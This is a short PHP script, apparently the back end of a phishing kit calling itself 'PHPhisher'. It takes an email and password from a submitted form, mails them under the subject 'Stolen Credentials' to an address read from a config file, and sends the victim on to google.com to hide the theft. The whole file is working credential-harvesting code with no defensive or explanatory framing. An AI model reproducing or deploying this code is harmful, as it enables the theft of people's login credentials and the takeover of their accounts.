<?php
$password = $_GET['password'];
$email = $_GET['email'];

$subject ="Stolen Credentials";
$message="Email: $email \nPassword: $password";
$header="from: PHPhisher";
$json = json_decode(file_get_contents("config.json"), true);
$to = $json['email'];

if (!$password){
echo '<script script type="text/javascript">';
echo 'window.location.href ="index.html";'; 
echo '</script>';
}
else{
echo '<script script type="text/javascript">';
echo 'window.location.href ="http://google.com/";'; 
echo '</script>';
mail($to,$subject,$message,$header);
}
?>